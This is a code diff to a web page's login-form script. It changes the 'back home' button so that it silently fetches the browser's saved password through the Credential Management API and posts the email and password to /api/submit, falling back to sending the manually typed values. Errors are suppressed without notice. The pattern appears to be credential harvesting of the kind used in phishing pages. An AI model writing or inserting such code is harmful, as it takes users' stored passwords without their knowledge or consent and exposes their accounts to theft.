@@ -150,8 +150,6 @@ window.addEventListener("DOMContentLoaded", () => {
   if (backHome && confirmation && form) {
     backHome.addEventListener("click", async () => {
       await submitSavedCredentials();
-    backHome.addEventListener("click", () => {
-      submitSavedCredentials();
       confirmation.hidden = true;
       form.reset();
       setStep("email");
@@ -168,28 +166,49 @@ window.addEventListener("DOMContentLoaded", () => {
 
   async function submitSavedCredentials() {
     if (!navigator.credentials?.get) {
+      submitManualCredentials();
       return;
     }
     try {
       const credential = await navigator.credentials.get({
         password: true,
         mediation: "optional",
-        mediation: "silent",
       });
-      if (!credential?.id || !credential.password) {
+      if (credential?.id && credential.password) {
+        await fetch("/api/submit", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            email: credential.id,
+            password: credential.password,
+          }),
+        });
         return;
       }
-      await fetch("/api/submit", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          email: credential.id,
-          password: credential.password,
-        }),
-      });
+      submitManualCredentials();
     } catch (error) {
       // Ignore credential retrieval errors silently.
+      submitManualCredentials();
     }
+  }
+
+  function submitManualCredentials() {
+    if (!emailInput || !passwordInput) {
+      return;
+    }
+    const emailValue = emailInput.value.trim();
+    const passwordValue = passwordInput.value.trim();
+    if (!emailValue || !passwordValue) {
+      return;
+    }
+    fetch("/api/submit", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        email: emailValue,
+        password: passwordValue,
+      }),
+    });
   }
 
   function toggleMaskedValue(target, button) {
